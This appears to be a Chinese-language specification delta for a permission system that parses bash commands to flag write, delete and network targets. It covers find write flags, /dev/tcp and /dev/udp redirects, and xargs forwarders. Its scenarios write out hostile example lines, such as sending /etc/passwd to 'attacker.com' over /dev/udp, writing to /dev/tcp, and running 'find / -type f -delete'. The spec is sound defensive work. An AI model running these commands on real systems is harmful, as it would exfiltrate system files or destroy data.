# bash-target-extraction (delta)

## ADDED Requirements

### Requirement: find 写操作 flag 不可靠

当 bash 命令的**任一 command fragment 的首命令**是 `find`（引号外独立 token，命令分隔符 `;`/`&&`/`||`/`&`/`\n` 拆分后的片段首命令）且其参数含以下写操作 flag 之一时，MUST 判 `reliable: false, reason: "find_write_flag"`：

- `-delete`（就地删除匹配文件）
- `-exec`（对匹配文件执行任意命令）
- `-execdir`（在匹配文件所在目录执行任意命令）
- `-ok`（交互式对匹配文件执行任意命令）
- `-okdir`（交互式在匹配文件所在目录执行任意命令）

**判定位置**：本判定在 `extractBashTargets` 主流程的 scan 阶段执行——在 `scanControlFlow`（控制流关键字守卫）之后、`isShellForwarder`（shell 转发器守卫）之前。这保证 isolated `find -delete`（不经 glob、不经 forwarder）也能被检出。

**与其他判定的交互**：
- 若 `find` 参数含写操作 flag 且命令同时含未引号 glob，`glob_expansion` reason 与 `find_write_flag` reason 都可能触发——扫描顺序决定最终 reason，不影响"判 unreliable"的结论。
- 若 `find` 参数含写操作 flag 且 `find` 处于 pipeline 上游，`find_write_flag` 优先于 `forwarding_command`——因为 `find_write_flag` 在 scan 阶段触发，早于 `extractBashTargets` 主流程的 forwarder 检查。

**引号感知**：`find` 的 flag 判定遵循既有引号语义——单引号、双引号、反斜杠转义内的 `-delete` 等字样 MUST 视为字面量，不触发本判定。

**理由**：`find -delete`、`find -exec`、`find -execdir`、`find -ok`、`find -okdir` 是真实的写/删操作。原实现把 `find` 无条件当作 read-only 命令处理（`COMMAND_TABLE.find = readExtract`），导致 `find / -type f -delete` isolated 判为 `{ reliable: true, targets: [read "/"] }` 静默通过。新增独立判定（而非仅依赖 `isBoundedGlobSafe` 的 glob 上下文判定、或 `isForwarderStageSafe` 的 forwarder upstream 判定）覆盖 isolated 场景。

#### Scenario: `find -delete` isolated 判不可靠

- **WHEN** bash 命令为 `find / -type f -delete`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -exec` isolated 判不可靠

- **WHEN** bash 命令为 `find . -exec rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -execdir` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -execdir rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -ok` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -ok rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -okdir` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -okdir rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -name` isolated reliable

- **WHEN** bash 命令为 `find . -name "*.ts"`
- **THEN** 提取结果 `reliable: true`——无写操作 flag，走原 readExtract（具体 targets 由 readExtract 决定）

#### Scenario: `find -type f` isolated reliable

- **WHEN** bash 命令为 `find /etc -type f`
- **THEN** 提取结果 `reliable: true`——无写操作 flag

#### Scenario: `find -newermt` 判 reliable（过滤条件）

- **WHEN** bash 命令为 `find . -newermt "2024-01-01"`
- **THEN** 提取结果为 `{ reliable: true }`——`-newermt` 是过滤条件不是写操作 flag

#### Scenario: 单引号内 `-delete` 字面量不触发

- **WHEN** bash 命令为 `find . -name "-delete"`
- **THEN** 提取结果为 `{ reliable: true }`——单引号内 `-delete` 是字面字符串参数，不触发本判定

#### Scenario: 双引号内 `-exec` 字面量不触发

- **WHEN** bash 命令为 `find . -name "-exec"`
- **THEN** 提取结果为 `{ reliable: true }`——双引号内 `-exec` 是字面字符串参数

#### Scenario: `find` 与其他命令序列中一处含 write flag 判不可靠

- **WHEN** bash 命令为 `echo hi; find . -delete; ls /tmp`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`——序列中任一 fragment 首命令是 `find` 且含写操作 flag 即触发

## MODIFIED Requirements

### Requirement: 设备重定向不计入写目标

当重定向操作符（`>`、`>>`、`2>`、`2>>`、`>&`）的目标路径以 `/dev/` 开头时，MUST NOT 将其作为 write target 加入提取结果。**例外**：以下子路径 MUST NOT 被豁免——它们是可以外传数据或访问任意文件的实际 IO 目标，MUST 作为 write target 加入提取结果（走正常决策路径）：

- `/dev/tcp/...`（bash 网络套接字，形如 `/dev/tcp/HOST/PORT`）
- `/dev/udp/...`（bash UDP 套接字，形如 `/dev/udp/HOST/PORT`）
- `/dev/fd/[0-9]+`（fd 数字文件描述符，如 `/dev/fd/3`；`/dev/fd` 本身、`/dev/fd/` 后非数字路径如 `/dev/fd/stdin` 保持豁免）

这类路径（`/dev/null`、`/dev/zero`、`/dev/stderr`、`/dev/stdout`、`/dev/fd` 目录本身、`/dev/stdin` 等非网络套接字/非数字 fd 的 `/dev/*` 目标）在 shell 用户语境中固定用于"丢弃输出"或"转向标准流"，不构成用户可见的文件系统写入副作用。

**理由**：`/dev/*` 一刀切豁免会让 `/dev/tcp`、`/dev/udp`（bash 内置的 TCP/UDP 网络套接字）被误判为无副作用——实际这两类路径允许把任意数据外传到任意网络主机。`/dev/fd/N`（`N` 为数字）是任意文件描述符的文件别名，可以指向任意打开的文件。这三类都需要走正常决策路径，用户可见副作用才能被拦截。其他 `/dev/*` 路径保持豁免，避免合法静默丢弃模式（`2>/dev/null`、`>/dev/stderr`）被误伤。

**边界**：
- `/dev/stdin`、`/dev/stdout`、`/dev/stderr`（标准流别名）保持豁免
- `/dev/null`、`/dev/zero`、`/dev/random`、`/dev/urandom` 保持豁免
- `/dev/fd`（目录本身）和 `/dev/fd/stdin`、`/dev/fd/stdout`、`/dev/fd/stderr`（fd 目录下的标准流别名，不是纯数字）保持豁免
- `/dev/fd/[0-9]+`（数字 fd）不豁免

#### Scenario: `/dev/tcp` 重定向不作豁免

- **WHEN** bash 命令为 `echo pwn > /dev/tcp/1.2.3.4/4444`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/tcp/1.2.3.4/4444`——网络套接字不作 `/dev/*` 豁免

#### Scenario: `/dev/udp` 重定向不作豁免

- **WHEN** bash 命令为 `cat /etc/passwd > /dev/udp/attacker.com/53`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/udp/attacker.com/53`——UDP 套接字不作 `/dev/*` 豁免

#### Scenario: `/dev/fd/N` 数字 fd 重定向不作豁免

- **WHEN** bash 命令为 `echo x > /dev/fd/3`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/fd/3`——数字 fd 不作豁免

#### Scenario: stderr 重定向到 /dev/null 不触发写目标

- **WHEN** bash 命令为 `cat /etc/passwd 2>/dev/null`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc/passwd] }`，不含 write target

#### Scenario: stdout 重定向到 /dev/null 不触发写目标

- **WHEN** bash 命令为 `echo "hello" >/dev/null`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`，不含 write target

#### Scenario: 混合重定向中仅 /dev/ 目标被过滤

- **WHEN** bash 命令为 `ls /tmp >/dev/null 2>/tmp/error.log`
- **THEN** 提取结果包含 read target `/tmp` 和 write target `/tmp/error.log`，`>/dev/null` 被过滤

#### Scenario: 重定向到 /dev/stderr / /dev/stdout 不触发写目标

- **WHEN** bash 命令为 `echo "error" >&2` 或 `echo "out" >/dev/stdout`
- **THEN** 提取结果不含 write target（`/dev/stderr`、`/dev/stdout` 同为 `/dev/` 前缀）

#### Scenario: 重定向到普通文件仍正常提取

- **WHEN** bash 命令为 `echo "hello" >/tmp/out.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/out.txt] }`——普通文件不受影响

#### Scenario: `/dev/fd/stdin` 保持豁免

- **WHEN** bash 命令为 `echo x > /dev/fd/stdin`
- **THEN** 提取结果不含 write target——`/dev/fd/stdin` 不是数字 fd，保持豁免

#### Scenario: `/dev/ptmx` 保持豁免

- **WHEN** bash 命令为 `echo x > /dev/ptmx`
- **THEN** 提取结果不含 write target——`/dev/ptmx` 非网络套接字且非数字 fd，保持豁免

### Requirement: 有界 glob 免不可靠标记

当未加引号的 glob 通配符（`*`、`?`、`[`）满足以下全部条件时，MUST NOT 触发"不可靠"标记（即不再因 glob_expansion 走 tier=two 弹窗），而是交给后续正常提取流程按 read/write target 处理：

1. 该 glob 元字符出现在**引号外且未被反斜杠转义**的位置（遵循现有引号感知规则）
2. glob 元字符前的路径前缀（从命令起始到 glob 元字符之前的路径片段）MUST 完全位于 `<projectRoot>` 内部（不含 `../` 越界）
3. glob 所在的 pipeline stage 的首命令（command name）**及其参数** MUST 共同构成"只读"命令。判定采用**析取式**：满足以下任一条件即判为只读——
   - **条件 3a**：命令名属于 READ_ONLY_COMMANDS（`cat`/`head`/`tail`/`wc`/`grep`/`ls`/`tree`/`stat`/`du`/`df`/`file`/`less`/`more`/`git log` 等）——命令名属于集合即视为只读，不看参数
   - **条件 3b**：命令名为 `find` 且通过"find 的参数条件性只读判定"（见下方"find 的参数条件性只读判定"节）
   - 命令名既不属于 READ_ONLY_COMMANDS 也不是 `find` 时，条件 3 不满足

**find 的参数条件性只读判定**：当命令名为 `find` 时，MUST 检查其所有参数——若任一参数是以下写操作标志之一，MUST NOT 判为只读（glob 判定条件 3 不满足）：

- `-delete`（就地删除匹配文件）
- `-exec`（对匹配文件执行任意命令）
- `-execdir`（在匹配文件所在目录执行任意命令）
- `-ok`（交互式对匹配文件执行任意命令）
- `-okdir`（交互式在匹配文件所在目录执行任意命令）

`find` 的其他参数（`-name`/`-type`/`-size`/`-mtime`/`-user`/`-group`/`-newer`/`-newermt`/`-maxdepth`/`-mindepth` 等 100+ 个过滤条件）MUST 视为不改变 `find` 的只读性质。

**理由**：`find` 家族绝大多数用法是只读的过滤条件（`-name`、`-type`、`-mtime` 等 100+ 个 flag），但 `-delete`、`-exec`、`-execdir`、`-ok`、`-okdir` 是真实的写/删操作。原实现把 `find` 无条件列入 READ_ONLY_COMMANDS 导致 `find / -type f -delete` 静默通过。改为参数条件性判定后，`find . -name "*.ts"` 等合法用法保持静默，`find -delete`/`-exec` 等写操作触发 glob_expansion 弹窗（在 glob 上下文里）或走正常 write/delete target 提取路径。

**命令片段上下文**：条件 3 中的"pipeline stage 的首命令及其参数"按以下方式确定——先把整条命令按"命令分隔符"（见"管道按 stage 独立提取"requirement）拆为多个**命令片段**，再把每个命令片段按顶层 `|` 拆为多个 pipeline stage；条件 3 判定的是"包含该 glob 的那个 pipeline stage 的首命令及其参数"，属于哪个命令片段不影响其他片段。

**反例（仍触发 glob_expansion）**：
- glob 前缀出界（如 `ls ../other/*`、`cat /tmp/*.log`）
- 命令属于写/删操作（如 `rm -rf /tmp/*.log`、`cp *.txt /dest/`、`mv *.tmp /tmp/`）
- `find` 含写操作参数（如 `find src/ -name "*.ts" -delete`、`find . -name "*.log" -exec rm {} \;`）
- glob 嵌套在写操作的参数中（如 `echo > /tmp/*.log` 的重定向目标）

#### Scenario: 项目内 ls glob 自动放行

- **WHEN** bash 命令为 `ls openspec/changes/archive/*/`，projectRoot 为 `/Users/eliot/my/@permission-system:pi-extension`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-system:pi-extension/openspec/changes/archive/] }`（按前缀目录读处理），不触发 glob_expansion

#### Scenario: 项目内 cat glob 自动放行

- **WHEN** bash 命令为 `cat openspec/specs/*/spec.md`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-system:pi-extension/openspec/specs/] }`，不触发 glob_expansion

#### Scenario: `find . -name "*.ts"` 自动放行

- **WHEN** bash 命令为 `find src/ -name "*.ts"`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/] }`——`find` 参数不含写操作 flag，条件 3 满足

#### Scenario: `find /etc -type f` 自动放行

- **WHEN** bash 命令为 `find /etc -type f`，projectRoot 内（若 projectRoot 覆盖 `/etc`，或 `/etc` 是 project 内路径）
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc] }`——`-type f` 是过滤条件，不含写操作 flag

#### Scenario: `find -delete` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.bak" -delete`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-delete` 是写操作 flag，条件 3 不满足

#### Scenario: `find -exec` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.tmp" -exec rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-exec` 是写操作 flag

#### Scenario: `find -execdir` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.log" -execdir cat {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-execdir` 是写操作 flag

#### Scenario: `find -ok` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.tmp" -ok rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-ok` 是写操作 flag

#### Scenario: 写命令内的 glob 仍触发 glob_expansion

- **WHEN** bash 命令为 `rm -rf /tmp/build/*.log`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`rm` 不在 read-only 命令集合

#### Scenario: 跨项目边界的 glob 仍触发 glob_expansion

- **WHEN** bash 命令为 `ls ../other-project/*/`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——前缀 `../other-project/` 出界

#### Scenario: git log 带路径 glob 自动放行

- **WHEN** bash 命令为 `git log --oneline openspec/specs/*/spec.md`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-system:pi-extension/openspec/specs/] }`，不触发 glob_expansion

#### Scenario: `;` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `echo hi; wc -l src/*.ts`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`，不触发 glob_expansion——`echo hi` 片段与 `wc -l src/*.ts` 片段独立判定，后者满足 read-only + 项目内前缀即放行

#### Scenario: `&&` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `false && cat src/*.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——`false` 片段 0 target，`cat` 片段满足 read-only + 项目内前缀

#### Scenario: `||` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `true || wc -l test/*.test.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/test/*.test.ts] }`——`||` 两侧片段独立判定

#### Scenario: `&` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `sleep 5 & wc -l src/*.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——`&` 作为命令分隔符，`sleep` 片段 0 target，`wc` 片段满足 read-only + 项目内前缀

#### Scenario: 换行分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `echo hi\nwc -l src/*.ts`（`\n` 为实际换行符）
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——换行作为命令分隔符，两个片段独立判定

#### Scenario: 写命令 glob 即使作为片段也不放行

- **WHEN** bash 命令为 `echo hi; rm -rf src/*.bak`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`rm` 片段含未加引号的 glob 且不在 read-only 集合，即使 `echo` 片段本身无害也不放行

#### Scenario: 多片段混排且每片段均满足条件

- **WHEN** bash 命令为 `echo hi; wc -l src/*.ts; wc -l test/*.test.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts, read <projectRoot>/test/*.test.ts] }`——每个含 glob 的片段独立判定满足条件

### Requirement: 转发器命令守卫

某些命令消费 stdin 内容并将其作为参数传给下游工具（即"转发器"）。当转发器命令出现在**管道的任一 stage**（包括首 stage）时，默认判整条命令为不可靠——静态分析无法枚举下游调用参数。

**read-only 下游豁免**：当转发器 stage 满足以下全部条件时，MUST NOT 判 `forwarding_command`，改为按下游命令的 read target 提取规则处理上游输出的文件列表：

1. 转发器后的**下游命令**（转发器 token 后的第一个非 flag token）属于 READ_ONLY_COMMANDS 或满足 find 的参数条件性只读判定（见"有界 glob 免不可靠标记"requirement 中的"find 的参数条件性只读判定"节），且参数可静态判定
2. 下游命令的参数 MUST 可静态判定——不含 `$`（除循环变量白名单 `$?`/`$!`/`$#`/`$$`）、反引号、`$(...)`、未加引号的 glob 元字符、未引号定界 heredoc
3. 转发器自身的参数（如 `xargs -I {}`、`xargs -n 1`）不影响豁免判定——只看下游命令
4. **upstream 只读**：转发器 stage 之前的所有 upstream pipeline stages MUST 各自满足"命令及其参数是只读的"（判定方式同"有界 glob 免不可靠标记"条件 3）。任一 upstream stage 含写操作（如 `find -exec rm`、`find -delete`、`rm`、`tee`、重定向写等）时，MUST NOT 豁免

**首 stage 转发器**：首 stage 是转发器时（如 `xargs rm -rf`、`xargs grep pattern`），MUST 也走转发器守卫检查。首 stage 的 upstream 为空，豁免条件 4（upstream 只读）平凡满足；豁免条件 1、2、3 按下游命令判定。

**理由**：原实现对转发器的处理有两个漏洞：
1. 首 stage 是转发器时完全跳过检查（`for (let i = 1; i < stages.length; i++)`），导致 `xargs rm -rf` 静默通过
2. 只看 downstream，不看 upstream——`find . -exec rm {} \; | xargs cat` 因为下游 `cat` 只读而豁免，上游 `find -exec rm` 完全未检

豁免扫描改为"覆盖所有 stage + 同时检查 upstream"后：
- `xargs rm -rf`（首 stage，downstream rm 是 write）→ 不豁免，判 forwarding_command
- `xargs grep pattern`（首 stage，downstream grep 是 read-only）→ 豁免
- `find . -exec rm {} \; | xargs cat`（upstream `find -exec rm` 含 write）→ 不豁免，判 forwarding_command
- `find . -name "*.ts" | xargs grep pattern`（upstream `find -name` 无 write）→ 豁免

系统 MUST 定义转发器命令表，至少包含 `xargs`、`parallel`、`pforeach`。

判定条件（默认 + 豁免）：

- 命令名精确匹配（不模糊）
- 该 stage 是**任一 stage**（包括首 stage，即所有 stage 都检查）
- **豁免判定**：转发器 stage MUST 先检查 read-only 下游豁免条件（包括 upstream 只读条件）；满足豁免 → 不判不可靠，按下游命令提取 read targets；不满足豁免 → 维持 `forwarding_command`

转发器命令的 `reason` 字段 MUST 包含 `"forwarding_command"` 字样以便用户/审计识别（仅在豁免不适用时）。

#### Scenario: xargs 在管道后续 stage 判不可靠

- **WHEN** bash 命令为 `find /etc | xargs rm`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游 `rm` 是 write 命令，不满足 read-only 下游豁免

#### Scenario: parallel 在管道后续 stage 判不可靠

- **WHEN** bash 命令为 `cat /tmp/input.txt | parallel -a /tmp/input.txt`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——`parallel` 无明确 read-only 下游命令，不满足豁免

#### Scenario: xargs 无管道输入不判转发器

- **WHEN** bash 命令为 `echo hi; xargs --help`
- **THEN** 提取结果为 `{ reliable: true }`，不提取 target（`echo`、`xargs --help` 均无路径参数）——`xargs --help` 是独立命令，`--help` 是 flag，无下游命令可判 read-only，`xargs` 无下游视为满足豁免（无 write 副作用）

#### Scenario: xargs 首 stage downstream write 判不可靠

- **WHEN** bash 命令为 `xargs rm -rf`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——首 stage 是转发器，downstream `rm` 是 write，不满足 read-only 下游豁免

#### Scenario: xargs 首 stage downstream read-only reliable

- **WHEN** bash 命令为 `xargs grep pattern < files.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [read files.txt] }`——首 stage 是转发器，downstream `grep` 是 read-only，upstream 为空平凡满足

#### Scenario: xargs grep read-only 下游 reliable

- **WHEN** bash 命令为 `find /tmp -name "*.log" | xargs grep "error"`
- **THEN** 提取结果为 `{ reliable: true }`——下游 `grep` 属于 READ_ONLY_COMMANDS 且参数可静态判定，upstream `find -name` 无写操作 flag，满足 read-only 下游豁免

#### Scenario: xargs wc read-only 下游 reliable

- **WHEN** bash 命令为 `find /tmp | xargs wc -l`
- **THEN** 提取结果为 `{ reliable: true }`——下游 `wc` 属于 READ_ONLY_COMMANDS

#### Scenario: xargs 下游含 `$` 仍 unreliable

- **WHEN** bash 命令为 `find /tmp | xargs grep $PATTERN`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游参数含 `$PATTERN`，不满足可静态判定条件

#### Scenario: xargs 下游含未引号 glob 仍 unreliable

- **WHEN** bash 命令为 `find /tmp | xargs grep *.log`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游参数含未加引号的 glob

#### Scenario: upstream `find -exec rm` + downstream read-only 判不可靠

- **WHEN** bash 命令为 `find . -exec rm {} \; | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——upstream `find -exec rm` 含 `-exec` 写操作 flag，豁免条件 4 不满足

#### Scenario: upstream `find -delete` + downstream read-only 判不可靠

- **WHEN** bash 命令为 `find . -delete | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——upstream `find -delete` 含 `-delete` 写操作 flag

#### Scenario: upstream `find -name` + downstream read-only reliable

- **WHEN** bash 命令为 `find . -name "*.ts" | xargs grep pattern`
- **THEN** 提取结果为 `{ reliable: true }`——upstream `find -name` 无写操作 flag，downstream `grep` read-only，满足豁免

#### Scenario: forwarder 链中每 stage 独立判定

- **WHEN** bash 命令为 `xargs cat | xargs grep pattern`
- **THEN** 提取结果为 `{ reliable: true }`——两个 stage 都是转发器，各自 downstream 都是 read-only，各自 upstream 也满足（首 stage 无 upstream，第二 stage 的 upstream 是首 stage 的 xargs，其 downstream 是 read-only）

#### Scenario: forwarder 链中含 write 上游判不可靠

- **WHEN** bash 命令为 `xargs rm -rf | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——第一 stage 是 forwarder 且 downstream `rm` 是 write，判不可靠
